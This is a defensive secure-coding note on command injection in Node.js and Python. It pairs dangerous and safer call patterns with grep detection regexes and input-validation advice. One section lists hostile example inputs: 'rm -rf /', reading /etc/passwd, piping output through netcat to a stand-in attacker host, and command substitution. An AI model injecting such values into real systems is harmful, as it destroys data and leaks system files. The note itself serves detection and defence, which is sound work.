# command injection patterns

patterns for detecting potential command injection vulnerabilities.

## dangerous patterns

### node.js

```javascript
// dangerous
exec(`ls ${userInput}`);
exec('ls ' + userInput);
spawn('sh', ['-c', `ls ${userInput}`]);

// safer
execFile('ls', [userInput]);  // still validate input!
spawn('ls', [userInput]);     // args are separate
```

### python

```python
# dangerous
os.system(f"ls {user_input}")
os.system("ls " + user_input)
subprocess.call(f"ls {user_input}", shell=True)

# safer
subprocess.run(["ls", user_input])  # no shell
```

## grep patterns

```
# javascript/typescript
exec\(.*\+.*\)                   # exec with concatenation
exec\(.*\$\{.*\}.*\)            # exec with template literals
spawn\(.*sh.*-c                  # spawn with shell
child_process.*\(.*\+.*\)       # child_process with concatenation

# python
os\.system\(.*\+.*\)            # os.system with concatenation
os\.system\(.*f".*\{.*\}.*\)   # os.system with f-strings
subprocess.*shell=True           # subprocess with shell=True
```

## injection techniques users might try

```bash
# command chaining
; rm -rf /
&& cat /etc/passwd
|| echo hacked

# piping
| nc attacker.com 4444

# redirection
> /etc/passwd

# command substitution
$(whoami)
`whoami`
```

## safe patterns to recommend

### input validation

```javascript
// whitelist allowed characters
const safe = /^[a-zA-Z0-9_-]+$/;
if (!safe.test(userInput)) {
  throw new Error('Invalid input');
}

// whitelist allowed values
const allowedCommands = ['ls', 'pwd', 'date'];
if (!allowedCommands.includes(userInput)) {
  throw new Error('Command not allowed');
}
```

### use safer apis

```javascript
// instead of exec
const { execFile } = require('child_process');
execFile('ls', ['-la', userInput], (error, stdout) => {
  // args are passed separately, not through shell
});

// better: use native apis instead of shell commands
const fs = require('fs');
fs.readdir(userInput, (err, files) => {
  // no shell involved at all
});
```

### escape/sanitize

```javascript
// shell-escape library
const shellescape = require('shell-escape');
exec(`ls ${shellescape([userInput])}`);

// better: don't use shell at all
```

## severity: critical

command injection is critical - allows arbitrary code execution.

## references

- https://owasp.org/www-community/attacks/Command_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
